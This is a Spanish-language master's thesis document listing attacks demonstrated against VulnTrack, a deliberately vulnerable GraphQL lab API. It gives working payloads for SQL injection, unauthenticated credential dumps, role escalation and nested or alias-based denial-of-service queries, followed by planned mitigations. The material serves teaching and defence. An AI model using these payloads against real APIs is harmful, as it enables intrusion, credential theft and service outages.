# Ataques Demostrados - VulnTrack API

Documentación de vectores de ataque ejecutables contra la API en Fase 1.

---

## 1. SQL INJECTION

### Ataque en searchUsers

Query normal:
```graphql
query {
  searchUsers(query: "admin") {
    id
    username
    email
  }
}
```

Ataque con bypass de búsqueda:
```graphql
query SQLInjectionUsers {
  searchUsers(query: "' OR '1'='1") {
    id
    username
    email
    passwordHash
  }
}
```

SQL ejecutado en backend:
```sql
SELECT * FROM users
WHERE username LIKE '%' OR '1'='1%'
OR email LIKE '%' OR '1'='1%'
```

Resultado: Retorna todos los usuarios con sus passwords en texto plano.

Impacto:
- Bypass completo de autenticación
- Acceso a todas las credenciales del sistema
- CVSS 9.8 (Critical)

---

### Ataque en searchCVEs

Ataque con manipulación de resultados:
```graphql
query SQLInjectionCVEs {
  searchCVEs(query: "Windows' OR '1'='1") {
    id
    cveId
    title
    cvssScore
    description
  }
}
```

SQL ejecutado:
```sql
SELECT * FROM cves
WHERE title LIKE '%Windows' OR '1'='1%'
OR description LIKE '%Windows' OR '1'='1%'
```

Resultado: Retorna todos los CVEs independientemente del criterio de búsqueda.

Impacto:
- El atacante controla la lógica de las queries
- Puede extraer información sensible
- CVSS 9.8 (Critical)

---

## 2. BROKEN ACCESS CONTROL - Sin Autenticación

Ataque con acceso sin credenciales:

Cualquiera puede ejecutar cualquier query o mutation sin proporcionar credenciales.
```graphql
query AccessWithoutAuth {
  users {
    id
    username
    email
    passwordHash
    role
  }
}
```

Resultado:
```json
{
  "data": {
    "users": [
      {
        "id": 1,
        "username": "admin",
        "email": "admin@vulntrack.io",
        "passwordHash": "admin123",
        "role": "ADMIN"
      }
    ]
  }
}
```

Impacto:
- No hay ninguna barrera de entrada al sistema
- Cualquier persona con acceso a la URL puede leer y modificar datos
- CVSS 9.8 (Critical)

---

## 3. BROKEN ACCESS CONTROL - Escalación de Privilegios

Escenario: Usuario ANALYST (ID: 3) quiere hacerse ADMIN sin autorización.

Ataque:
```graphql
mutation PrivilegeEscalation {
  updateUserRole(userId: 3, newRole: ADMIN) {
    id
    username
    role
  }
}
```

Resultado:
```json
{
  "data": {
    "updateUserRole": {
      "id": 3,
      "username": "analyst",
      "role": "ADMIN"
    }
  }
}
```

Impacto:
- Cualquier usuario puede auto-promocionarse a administrador
- Control de acceso completamente inexistente
- CVSS 9.8 (Critical)

---

## 4. INFORMATION DISCLOSURE - Passwords en Texto Plano

Ataque:
```graphql
query PasswordLeak {
  users {
    username
    passwordHash
  }
}
```

Resultado:
```json
{
  "data": {
    "users": [
      {
        "username": "admin",
        "passwordHash": "admin123"
      },
      {
        "username": "researcher",
        "passwordHash": "research123"
      },
      {
        "username": "analyst",
        "passwordHash": "analyst123"
      }
    ]
  }
}
```

Impacto:
- Todas las credenciales visibles en texto plano
- No hay hashing (BCrypt, Argon2, etc.)
- El atacante puede hacer login como cualquier usuario
- CVSS 10.0 (Critical)

---

## 5. DENIAL OF SERVICE - Queries Circulares (Deep Nesting)

Ataque con consultas profundamente anidadas:
```graphql
query CircularDoS {
  products {
    name
    vendor {
      name
      products {
        name
        vendor {
          name
          products {
            name
            vendor {
              name
              products {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

Impacto:
- Alto consumo de CPU y memoria del servidor
- Puede provocar timeout o caída del servicio
- Afecta a todos los usuarios conectados
- CVSS 7.5 (High)

Nota técnica: La relación bidireccional Product ↔ Vendor con FetchType.EAGER permite anidación infinita.

---

### Variante: Alias-Based DoS

Ataque con multiplicación de queries:
```graphql
query AliasDoS {
  u1: users { id username email }
  u2: users { id username email }
  u3: users { id username email }
  u4: users { id username email }
  u5: users { id username email }
  u6: users { id username email }
  u7: users { id username email }
  u8: users { id username email }
  u9: users { id username email }
  u10: users { id username email }
}
```

Impacto:
- Una sola petición HTTP ejecuta 10 queries a la base de datos
- Fácilmente escalable a 100+ aliases
- Consumo exponencial de recursos
- CVSS 7.5 (High)

---

## 6. DENIAL OF SERVICE - Sin Paginación

Ataque con extracción masiva de datos:
```graphql
query NoPagination {
  users {
    id
    username
    email
    fullName
    createdAt
    updatedAt
  }
}
```

Impacto:
- Si hay 100,000 usuarios, retorna todos en una sola response
- Consume memoria del servidor y del cliente
- Ancho de banda desperdiciado
- Tiempo de respuesta extremadamente alto
- CVSS 5.3 (Medium)

Nota: Sin paginación ni límites (first/after pattern), el sistema no escala.

---

## Resumen de Vulnerabilidades
```
#  Vulnerabilidad                Tipo                        Severidad  CVSS
1  SQL Injection (users)         Injection                   CRITICAL   9.8
2  SQL Injection (cves)          Injection                   CRITICAL   9.8
3  Sin Autenticación             Broken Access Control       CRITICAL   9.8
4  Escalación de Privilegios     Broken Access Control       CRITICAL   9.8
5  Passwords en Texto Plano      Information Disclosure      CRITICAL   10.0
6  Queries Circulares DoS        DoS                         HIGH       7.5
7  Sin Paginación                DoS                         MEDIUM     5.3
```

Total: 7 vulnerabilidades demostradas (5 críticas, 1 alta, 1 media)  
CVSS Total: 60.9

---

## Mitigaciones Planificadas (Fase 2)

En Fase 2 se implementarán:

**SQL Injection**: Usar Panache queries parametrizadas o CriteriaAPI

**Autenticación**: JWT con SmallRye JWT

**Autorización**: @RolesAllowed en mutations sensibles

**Passwords**: Hashing con BCrypt (Quarkus Elytron)

**Query Depth**: quarkus.smallrye-graphql.max-depth=5

**Query Complexity**: Custom instrumentation

**Paginación**: Implementar patrón cursor-based (first/after)

---

## Referencias

- Black Hat GraphQL (Dolev Farhi & Nick Aleks, 2023) - Capítulos 4, 5, 6
- OWASP API Security Top 10 (2023)
- OWASP GraphQL Cheat Sheet
- CWE-89: SQL Injection
- CWE-287: Improper Authentication
- CWE-862: Missing Authorization

---

Autor: Bladimir Gonzales Miranda  
Director: Rubén Pérez Chacón  
TFM: Seguridad en APIs GraphQL con Quarkus  
Universidad: UNIR - Máster en Ciberseguridad  
Fecha: Noviembre 2025